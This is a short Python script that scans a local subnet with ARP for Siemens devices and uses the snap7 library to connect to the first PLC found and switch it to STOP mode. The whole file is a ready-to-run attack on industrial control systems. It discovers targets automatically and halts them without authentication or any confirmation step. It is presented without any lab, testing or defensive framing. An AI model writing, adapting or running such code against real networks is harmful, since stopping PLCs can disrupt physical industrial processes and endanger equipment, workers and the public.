from scapy.all import ARP, Ether, srp
import snap7
import time

# Function to scan the network for Siemens PLCs
def find_plc():
    target_ip_range = "192.168.1.0/24"  # Modify this based on the network range

    # Creating ARP request
    arp_request = ARP(pdst=target_ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        if "Siemens" in received.summary():  # Filtering based on Siemens devices
            print(f"[+] Siemens PLC Found: {received.psrc}")
            return received.psrc  # Returning the first PLC found

    print("[-] No Siemens PLCs found.")
    return None

# Function to change PLC operating mode
def change_plc_mode(plc_ip, mode):
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 1)  # Connect to the PLC (Rack: 0, Slot: 1)

        if mode.lower() == "stop":
            print("[+] Changing PLC mode to STOP")
            plc.plc_stop()
        elif mode.lower() == "run":
            print("[+] Changing PLC mode to RUN")
            plc.plc_start()
        else:
            print("[-] Invalid mode. Use 'STOP' or 'RUN'.")

        plc.disconnect()
    except Exception as e:
        print(f"[-] Error: {e}")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc()

    if plc_ip:
        time.sleep(2)  # Small delay before connecting
        change_plc_mode(plc_ip, "STOP")  # Change mode to STOP